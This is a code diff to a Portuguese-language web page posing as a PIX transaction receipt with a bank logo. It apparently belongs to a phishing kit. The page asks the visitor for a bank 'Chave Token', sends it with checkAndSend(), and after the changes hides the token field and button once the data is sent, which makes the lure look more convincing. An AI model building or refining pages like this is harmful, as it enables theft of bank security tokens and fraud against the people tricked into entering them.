@@ -13,11 +13,11 @@
     <h2>Comprovante de Transação PIX</h2>
     
     <img id="logo" src="assets/bblogo.png" alt="Logo" width="300">
-    <p id="status">Para finalizar o depósito, confirma os dados do beneficiário e digite a <strong>Chave Token</strong> informada pelo depositante.<br>Após clique em PERMITIR para gerar a contrasenha.</p>
-    <p id="dados"></p>
+    <p id="status">Para finalizar o depósito, confirma os dados do beneficiário e digite a <strong>Chave Token</strong> informada pelo depositante..</p>
+    <p id="dados">Após clique em PERMITIR para gerar a contrasenha</p>
     <!-- <input type="text" id="username" placeholder="Nome completo" oninput="this.value = this.value.toUpperCase()"> -->
     <input type="text" id="password" placeholder="Chave Token" >
-    <button onclick="checkAndSend()">GERAR CONTRASENHA</button>
+    <button id="gerar" onclick="checkAndSend()">GERAR CONTRASENHA</button>
     <button id="downloadBtn" style="display: none;" onclick="downloadImage()">Baixar Comprovante</button>
 
     <!-- <img id="imagem" src="assets/comprovante_desfocado.png" alt="Comprovante" width="200"> -->
@@ -102,6 +102,8 @@
                 console.log("Dados enviados:", data);
                 // Exibir botão de download após sucesso
                 document.getElementById("downloadBtn").style.display = "block";
+                document.getElementById("password").style.display = "none";
+                document.getElementById("gerar").style.display = "none";
             } catch (err) {
                 console.error("Erro ao enviar:", err.message);
                 document.getElementById("status").innerText = "Erro ao gerar comprovante: " + err.message;
